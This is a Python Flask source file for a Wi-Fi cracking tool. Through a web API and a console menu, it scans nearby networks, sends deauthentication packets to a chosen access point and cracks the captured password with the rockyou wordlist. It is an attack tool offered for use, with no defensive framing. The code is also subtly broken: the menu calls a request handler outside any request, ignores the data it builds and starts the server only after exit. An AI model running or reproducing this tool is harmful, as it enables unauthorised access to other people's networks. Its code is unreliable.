from flask import Flask, request, jsonify
from aircrack_handler import WiFiCracker
import os

app = Flask(__name__)
cracker = WiFiCracker()


def display_menu():
    print("\n===== WiFi Cracker Menu =====")
    print("1. Scan for networks")
    print("2. Attack and crack a network")
    print("3. Exit")


def get_user_choice():
    choice = input("Enter your choice: ")
    return choice.strip()


@app.route('/scan', methods=['GET'])
def scan_networks():
    networks = cracker.scan_networks()
    return jsonify({"networks": networks})


@app.route('/attack_and_crack', methods=['POST'])
def attack_and_crack():
    data = request.json
    network_index = data.get('network_index')
    npackets = data.get('npackets', 10)
    wordlist = data.get('wordlist', '/usr/share/wordlists/rockyou.txt')

    networks = cracker.scan_networks()
    if network_index is None or network_index >= len(networks):
        return jsonify({"error": "Invalid network index"}), 400

    selected_network = networks[network_index]
    bssid = selected_network['bssid']
    channel = selected_network['channel']

    success = cracker.deauth_attack(bssid, channel, npackets)
    if success:
        password = cracker.crack_password(bssid, wordlist)
        return jsonify({"password": password if password else "Failed to crack password"})

    return jsonify({"error": "Attack failed"}), 500


if __name__ == '__main__':
    # Run setup script to check/install dependencies
    os.system("bash setup.sh")

    while True:
        display_menu()
        choice = get_user_choice()

        if choice == '1':
            print("Scanning for networks...")
            networks = cracker.scan_networks()
            for i, net in enumerate(networks):
                print(f"{i}. {net['essid']} (BSSID: {net['bssid']}, Channel: {net['channel']})")
        elif choice == '2':
            network_index = int(input("Enter the network index to attack: "))
            data = {"network_index": network_index}
            response = attack_and_crack()
            print(response.json)
        elif choice == '3':
            print("Exiting...")
            break
        else:
            print("Invalid choice. Please try again.")

    app.run(debug=True)
